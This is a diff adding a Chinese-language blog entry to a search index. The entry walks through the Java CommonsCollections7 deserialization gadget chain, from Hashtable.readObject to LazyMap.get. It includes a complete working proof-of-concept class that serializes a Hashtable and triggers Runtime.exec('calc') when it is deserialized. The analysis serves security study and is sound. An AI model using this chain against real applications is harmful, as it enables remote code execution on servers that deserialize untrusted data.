@@ -4615,4 +4615,281 @@ public class ProxyTest {
         <tag>零碎知识</tag>
       </tags>
   </entry>
+  <entry>
+    <title>8、CC7</title>
+    <url>/2023/08/25/8%E3%80%81CC7/</url>
+    <content><![CDATA[# CC7
+## 利用版本
+jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
+## CC7 Demo
+```java=
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class CommonsCollections7 {
+
+    public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException {
+
+        Transformer[] fakeTransformer = new Transformer[]{};
+
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+
+        //ChainedTransformer实例
+        //先设置假的 Transformer 数组，防止生成时执行命令
+        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);
+
+        //LazyMap实例
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+
+        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
+        lazyMap1.put("yy", 1);
+
+        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
+        lazyMap2.put("zZ", 1);
+
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, "test");
+        hashtable.put(lazyMap2, "test");
+
+
+        //通过反射设置真的 transformer 数组
+        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
+        field.setAccessible(true);
+        field.set(chainedTransformer, transformers);
+
+        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=>yy，所以这里要移除
+        lazyMap2.remove("yy");
+
+        //序列化
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(hashtable);
+        oos.flush();
+        oos.close();
+
+        //测试反序列化
+        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+    }
+
+}
+
+```
+
+## 分析
+CC7和CC5、CC6差不多，，调用命令的部分和CC6一模一样
+
+![](https://s3.hedgedoc.org/demo/uploads/29b5b390-3b1b-4b2a-a266-7f6437214fd4.png)
+
+不同LayzMap对象封装到Hashtable对象中，序列化的对象是Hashtable对象
+
+![](https://s3.hedgedoc.org/demo/uploads/3f84a074-b0fc-422b-9460-f69efbc1e12a.png)
+
+这里直接在demo中readObject处打一个断点进行调试，因为demo中序列化的是一个Hashtable对象，所以调用链从Hashtable.readObject()开始
+
+![](https://s3.hedgedoc.org/demo/uploads/1afc1052-72b0-41c0-bed4-d27f62f850f2.png)
+## 调用链
+1. Hashtable.readObject()
+2. Hashtable.reconstitutionPut()
+3. AbstractMapDecorator.equals()
+4. AbstractMap.equals()
+5. LazyMap.get()
+
+### Hashtable.readObject()
+在Hashtable.readObject()打一个断点，然后调试
+
+![](https://s3.hedgedoc.org/demo/uploads/ef37f268-41ef-49fc-86a7-7c14cae2e189.png)
+
+这里elements（对象）有是2，代表有两个元素
+
+这是因为demo中把两个LazyMap对象给封装到了Hashtable对象中
+
+![](https://s3.hedgedoc.org/demo/uploads/1b4c5cc1-eb02-4c56-99d5-51ebc18ef14a.png)
+
+继续向下分析
+
+![](https://s3.hedgedoc.org/demo/uploads/7ed6da7e-f960-402d-85cd-bf33fa8f1db8.png)
+
+首先第一个元素的key是一个LazyMap对象，他的key是yy，这里对应的是lazyMap1，继续调试
+
+![](https://s3.hedgedoc.org/demo/uploads/676bba9d-14cd-4f94-a038-9e2820c7556a.png)
+
+第二个元素的也是一个LazyMap对象，他的key是zZ，这里对应的是lazyMap1
+
+最后都会将key和value传入reconstitutionPut()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/cf44d58d-f6f9-4642-92ad-eff0e2484dd9.png)
+
+### Hashtable.reconstitutionPut()
+在Hashtable.reconstitutionPut()打一个断点，然后调试
+
+![](https://s3.hedgedoc.org/demo/uploads/0811e98a-e67b-489e-970b-78de998241ab.png)
+
+首先这里传入的key，是lazyMap1
+
+这里先是计算了key（lazyMap1）的hash为3873，然后计然后计算了hash在tab中的位置
+
+但是tab[index]并没有值，因为此时tab里面没有任何元素，为null
+
+![](https://s3.hedgedoc.org/demo/uploads/f3d885e5-7c64-4ddf-971f-ac5b2eadbbe0.png)
+
+所以e为null，不会进入for循环，而是进入到后面1248行的代码逻辑
+
+![](https://s3.hedgedoc.org/demo/uploads/af61dcfc-8902-4834-8c1e-3d64dba9543a.png)
+
+先把tab[index]（null）赋值给e
+
+然后将计算出来的hash、key和其他的变量value、e给传入到tab[index]进行赋值
+
+我们继续调试
+
+后面再一次进入了reconstitutionPut()方法，此时传入的key是lazyMap2
+
+![](https://s3.hedgedoc.org/demo/uploads/a73959be-d9ab-40c2-8304-d7cc1fe67af6.png)
+
+而key的hash和第一次进入reconstitutionPut()计算的hash一样，都是3873，所以他们在tab中的位置是一样的
+
+又因为第一次进入reconstitutionPut()时候给tab[index]赋值了，所以这次就会进入for循环
+
+![](https://s3.hedgedoc.org/demo/uploads/5a246600-4064-4a7f-b374-c52affd06220.png)
+
+此时e就是tab[index]，tab[index]的key就是lazyMap1
+
+而且这里还将key（LazyMap2）传给了e.key（LazyMap）.equals()
+
+![](https://s3.hedgedoc.org/demo/uploads/255be8a8-d269-4b89-993f-a9caba70b8d1.png)
+
+所以接下来得跟进LazyMap.equals()
+
+### AbstractMapDecorator.equals()
+这里有个问题，按道理说在调用链里面，应该是触发LazyMap.equals()，为什么后面的是触发AbstractMapDecorator.equals()方法？
+
+因为AbstractMapDecorator是LazyMap的父类
+
+![](https://s3.hedgedoc.org/demo/uploads/e957ff1d-1938-43d6-9c93-5979ac6788c3.png)
+
+LazyMap既然继承于AbstractMapDecorator，那AbstractMapDecorator的方法和成员变量LazyMap理应也一并继承了的，LazyMap不存在equals()方法，但是他的父类AbstractMapDecorator有，所以就调用AbstractMapDecorator.equals()
+
+我们在AbstractMapDecorator.equals()打个断点，继续调试分析
+
+![](https://s3.hedgedoc.org/demo/uploads/602e2561-d918-4c61-84cb-f09e56e30f95.png)
+
+这里首先判断传入的Object对象object是否是当前对象，如果是，就返回true
+
+但是这里当前对象是lazyMap1，而传入的是lazyMap2，所以就进入129行的代码，调用了map.equals(object)
+
+![](https://s3.hedgedoc.org/demo/uploads/08dc1020-5225-4dbc-9e3a-f62d01e5fb23.png)
+
+此时的成员变量map，是一个HashMap对象
+
+对应的赋值是在demo中将给lazyMap1赋值的时候
+
+![](https://s3.hedgedoc.org/demo/uploads/18e42de7-0dcb-48b2-bc95-94ff69fa0f3d.png)
+
+所以接下来得跟进HashMap.equals()
+
+### AbstractMap.equals()
+和LazyMap.equals()的情况一模一样，HahsMap没有equals()方法，所以这里也是调用HashMap父类AbstractMap的equals()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/a6a56858-7cb5-4578-8b5a-32fd09d55d90.png)
+
+在AbstractMap.equals()那里打个断点继续调试
+
+![](https://s3.hedgedoc.org/demo/uploads/1e7e1b7b-fc02-4989-a465-76b741528462.png)
+
+这里equals()传入的Object对象o是lazyMap2
+
+在代码第481行时，将o赋值给Map对象m（对象m就成了LazyMap对象）
+
+在代码第495行时，调用了m.get()方法（相当于调用了LazyMap.get()方法），此时的key是yy
+
+继续跟进LazyMap.get()方法
+
+### LazyMap.get()
+在LazyMap.get()打个断点，继续调试
+
+![](https://s3.hedgedoc.org/demo/uploads/a7099be0-e86f-43dc-8d95-1fa1e5b7d0e7.png)
+
+这里先会判断传入的key是否在成员变量map中，此时传入的key是“yy”，成员变量map是“zZ->1”，yy不在map中，所以会进入if语句中，成功进入到157行，成功触发factory.transform(key)，即后续的命令执行链
+
+![](https://s3.hedgedoc.org/demo/uploads/3b039944-4cb0-4605-8a39-231ef1790d04.png)
+
+成功弹出计算器
+
+## 其他代码
+
+### fakeTransformer
+![](https://s3.hedgedoc.org/demo/uploads/4a09d3b8-7e53-47d1-8e0b-21f9a98e313a.png)
+
+这里设置fakeTransformer的原因很简单，因为在hashtable.put()方法的时候，会调用LazyMap.get()方法
+
+这里直接在hashtable.put()中打个断点调试
+
+![](https://s3.hedgedoc.org/demo/uploads/113d0f52-d52e-48ba-b2c9-a6a179bed460.png)
+
+这样在没有反序列化的时候，就触发了命令执行，后续反序列化的时候就无法触发命令执行链了，不符合我们的预期，所以得先设置一个空的命令执行链，以免在调用hashtable.put()的时候触发命令执行
+
+当然，在调用完hashtable.put()后，需要将空的Transformer数组对象换成能调用命令的Transformer数组对象
+
+demo中用的是将Transformer数组对象封装进ChainedTransformer对象中的，也就是赋值给成员iTransformers的
+
+![](https://s3.hedgedoc.org/demo/uploads/c135cce7-9626-4ac3-b99c-65bba1fb6442.png)
+
+而成员变量iTransformers是用private修饰的，所以需要用反射修改
+
+![](https://s3.hedgedoc.org/demo/uploads/caf479cb-f6ef-438d-b023-88088cbdd4b3.png)
+
+### lazyMap2.remove("yy"); 
+![](https://s3.hedgedoc.org/demo/uploads/08f9940d-bb92-4ae7-badc-0e130485ef0b.png)
+
+为什么要移除lazyMap2中的键对“yy”，因为在调用hashtable.put(lazyMap2, "test");的时候，就会再添加一个yy->yy
+
+![](https://s3.hedgedoc.org/demo/uploads/2b5ed482-619a-43e4-bed6-bac74224fae5.png)
+
+这样会影响AbstractMap.equals()调用链的调用过程，不会进入LazyMap.get()链中
+
+![](https://s3.hedgedoc.org/demo/uploads/1b8fa5ad-aa80-4496-acf9-f0f4eba5adfb.png)
+
+所以需要在demo代码中将“yy->yy”去掉
+
+## 学习
+https://xz.aliyun.com/t/9409
+
+https://zhuanlan.zhihu.com/p/647418911
+
+https://cloud.tencent.com/developer/article/1809858
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>利用链</tag>
+      </tags>
+  </entry>
 </search>
